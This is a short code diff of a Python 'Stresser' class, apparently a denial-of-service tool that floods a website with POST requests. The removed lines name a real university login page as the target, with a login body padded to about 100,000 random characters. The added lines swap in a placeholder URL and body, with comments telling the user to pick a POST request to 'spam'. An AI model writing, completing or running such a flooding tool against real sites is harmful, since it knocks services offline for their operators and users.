@@ -212,8 +212,13 @@ class Stresser:
     def __init__(self, number_of_threads: int) -> None:
         self.number_of_threads = number_of_threads
         self.data = str(random.choices(string.ascii_lowercase, k=99_999))
-        self.post_url = "http://www.ftn.kg.ac.rs/mojnalog"
-        self.package = f'"LOGUSER={self.data}&LOGPASS={self.data}'
+        self.post_url = "http://www.example.com"
+        # find the right post request that you want to spam
+        # example: f'"LOGUSER={self.data}&LOGPASS={self.data}'
+        # self.data is important because its a package of 100000 chars
+        # that is being sent in a request
+        
+        self.package = f'POST request here'
         self.stop = False
 
     def attack(self) -> None:
